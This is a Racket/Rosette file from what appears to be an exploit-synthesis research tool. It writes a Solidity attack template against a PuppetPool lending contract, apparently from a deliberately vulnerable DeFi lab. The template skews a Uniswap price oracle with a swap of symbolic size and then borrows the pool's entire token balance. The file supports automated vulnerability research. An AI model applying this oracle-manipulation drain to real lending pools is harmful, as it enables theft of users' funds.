#lang rosette
(require
    (prefix-in tokamak: "../tokamak.rkt")
)
(provide (rename-out
    [prepare-synth prepare-synth]
))

(define temp-str
"// SPDX-License-Identifier: MIT
pragma solidity >=0.8.13;

import {Harness} from \"./Harness.sol\";
import {ERC20} from \"./ERC20.sol\";
import {PuppetPool} from \"./PuppetPool.sol\";
import {UniswapModel} from \"./UniswapModel.sol\";

contract Synthesis is Harness {

    // override any existing attack function from harness
    function attack() public override {
        synthesis();
    }

    function synthesis() public {
        synthesis0();
    }

    function synthesis0() public {
        uint256 sym0 = eurus_symbolic_uint256(\"sym0\");
        tgtToken.approve(address(uniswap), 1000);
        uint256 newETH = uniswap.swapDVT4ETH(0, sym0);
        pool.borrow(tgtToken.balanceOf(address(pool)), 0);
        eurus_synthesize(\"synthesize\", tgtToken.balanceOf(address(pool))==0);
    }

}"
)

; will output attack contract to basepath
(define (prepare-synth basepath info)
    (define synth-file (open-output-file (build-path basepath "Synthesis.sol") #:exists 'replace))
    (display temp-str synth-file)
    (close-output-port synth-file)
)